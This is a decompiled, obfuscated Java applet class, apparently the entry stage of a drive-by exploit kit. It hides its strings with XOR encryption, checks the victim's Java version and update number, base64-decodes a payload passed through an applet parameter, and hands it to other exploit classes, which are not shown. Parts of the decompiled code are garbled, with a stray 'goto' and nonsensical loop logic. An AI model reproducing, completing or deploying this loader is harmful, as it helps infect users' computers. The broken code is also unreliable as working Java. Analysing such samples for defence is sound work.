// 
// Decompiled by Procyon v0.5.30
// 

package ramblera;

import java.applet.Applet;

public class ramblerd extends Applet
{
    private static final String[] z;
    
    static boolean ramblera() {
        final boolean ramblerm = ramblerf.ramblerm;
        final String ramblera = ramblerb.ramblera();
        final int int1 = Integer.parseInt(ramblera.substring(ramblera.indexOf("_".charAt(0)) + 1));
        final boolean equals = ramblera.substring(0, 3).equals(ramblerd.z[0]);
        if (!ramblerm) {
            if (equals) {
                final boolean b = int1 != 0;
                if (ramblerm || (b ? 1 : 0) == 5) {
                    return b;
                }
                final boolean b3;
                final boolean b2 = b3 = (int1 != 0);
                if (!ramblerm) {
                    if ((b2 ? 1 : 0) == 6) {
                        goto Label_0070;
                    }
                }
            }
        }
        return equals;
    }
    
    public void init() {
        final boolean ramblerm = ramblerf.ramblerm;
        if (ramblera()) {
            final ramblerb ramblerb = new ramblerb();
            try {
                ramblerb.init(this.getParameter(ramblerd.z[1]).substring(1));
                return;
            }
            catch (Throwable t2) {
                if (!ramblerm) {
                    return;
                }
            }
        }
        ramblerf ramblerf;
        while (true) {
            ramblerf = new ramblerf();
            int n = 0;
        Label_0072_Outer:
            while (true) {
                while (true) {
                    Label_0075: {
                        try {
                            if (!ramblerm) {
                                break Label_0075;
                            }
                            ramblerf.ramblera(null);
                        }
                        catch (Throwable t) {
                            throw t;
                        }
                        ++n;
                    }
                    if (n >= 100000) {
                        try {
                            Thread.sleep(10L);
                            if (ramblerm) {
                                continue;
                            }
                        }
                        catch (InterruptedException ex) {}
                        break;
                    }
                    break;
                }
                continue Label_0072_Outer;
            }
        }
        ramblerc.ramblerc(ramblerf.ramblera(this.getClass().getClassLoader()), this.getParameter(ramblerd.z[1]).substring(1));
    }
    
    public static int ramblerb(final String s) {
        int n = 0;
        for (int n2 = s.length() - 1; n2 > 0 && s.charAt(n2) == '='; --n2) {
            ++n;
        }
        return n;
    }
    
    public static byte[] ramblera(final String s) {
        final byte[] array = new byte[s.length() * 6 / 8 - ramblerb(s)];
        int n = 0;
        for (int i = 0; i < s.length(); i += 4) {
            final int n2 = (ramblere.ramblera(s.charAt(i)) << 18) + (ramblere.ramblera(s.charAt(i + 1)) << 12) + (ramblere.ramblera(s.charAt(i + 2)) << 6) + ramblere.ramblera(s.charAt(i + 3));
            for (int n3 = 0; n3 < 3 && n + n3 < array.length; ++n3) {
                array[n + n3] = (byte)(n2 >> 8 * (2 - n3) & 0xFF);
            }
            n += 3;
        }
        return array;
    }
    
    public static ramblerc ramblera(final ramblerf ramblerf) {
        return ramblere.ramblera(ramblerf);
    }
    
    static {
        final String[] z2 = new String[2];
        final int n = 0;
        final char[] charArray = "RU\\".toCharArray();
        int length;
        int n3;
        final int n2 = n3 = (length = charArray.length);
        int n4 = 0;
        while (true) {
            Label_0098: {
                if (n2 > 1) {
                    break Label_0098;
                }
                length = (n3 = n4);
                do {
                    final char c = charArray[n3];
                    char c2 = '\0';
                    switch (n4 % 5) {
                        case 0: {
                            c2 = 'c';
                            break;
                        }
                        case 1: {
                            c2 = '{';
                            break;
                        }
                        case 2: {
                            c2 = 'k';
                            break;
                        }
                        case 3: {
                            c2 = ';';
                            break;
                        }
                        default: {
                            c2 = 'o';
                            break;
                        }
                    }
                    charArray[length] = (char)(c ^ c2);
                    ++n4;
                } while (n2 == 0);
            }
            if (n2 > n4) {
                continue;
            }
            break;
        }
        z2[n] = new String(charArray).intern();
        final int n5 = 1;
        final char[] charArray2 = "\u0016\u0012\u000f".toCharArray();
        int length2;
        int n7;
        final int n6 = n7 = (length2 = charArray2.length);
        int n8 = 0;
        while (true) {
            Label_0214: {
                if (n6 > 1) {
                    break Label_0214;
                }
                length2 = (n7 = n8);
                do {
                    final char c3 = charArray2[n7];
                    char c4 = '\0';
                    switch (n8 % 5) {
                        case 0: {
                            c4 = 'c';
                            break;
                        }
                        case 1: {
                            c4 = '{';
                            break;
                        }
                        case 2: {
                            c4 = 'k';
                            break;
                        }
                        case 3: {
                            c4 = ';';
                            break;
                        }
                        default: {
                            c4 = 'o';
                            break;
                        }
                    }
                    charArray2[length2] = (char)(c3 ^ c4);
                    ++n8;
                } while (n6 == 0);
            }
            if (n6 <= n8) {
                z2[n5] = new String(charArray2).intern();
                z = z2;
                return;
            }
            continue;
        }
    }
}
